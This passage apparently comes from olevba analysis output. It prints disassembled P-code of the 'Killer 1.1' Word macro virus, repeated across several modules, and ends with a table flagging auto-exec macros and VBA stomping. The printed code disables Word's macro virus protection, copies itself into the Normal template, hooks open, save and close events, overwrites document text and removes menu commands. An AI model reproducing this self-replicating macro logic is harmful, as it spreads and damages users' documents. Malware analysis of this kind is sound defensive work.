' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer42 - 4547 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer43 - 6203 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer44 - 8583 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer45 - 4547 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
